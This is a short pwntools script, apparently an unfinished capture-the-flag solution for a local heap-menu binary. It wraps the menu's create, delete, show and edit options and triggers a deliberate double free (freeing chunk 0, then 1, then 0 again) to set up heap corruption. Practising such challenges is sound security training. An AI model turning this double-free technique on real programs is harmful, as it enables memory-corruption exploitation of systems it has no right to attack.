from pwn import *

elf = context.binary = ELF("./chall",False)
p = process()


def create(idx,size):
    p.recvuntil(b"choice:")
    p.sendline(b"1")
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())

def delete(idx):
    p.recvuntil(b"choice:")
    p.sendline(b"2")
    p.sendline(str(idx).encode())


def show(idx):
    p.recvuntil(b"choice:")
    p.sendline(b"3")
    p.sendline(str(idx).encode())



def edit(idx,data):
    p.recvuntil(b"choice:")
    p.sendline(b"4")
    p.sendline(str(idx).encode())
    p.sendline(str(data).encode())




create(0,0x20)
create(1,0x20)
delete(0)
delete(1)
delete(0)

p.interactive()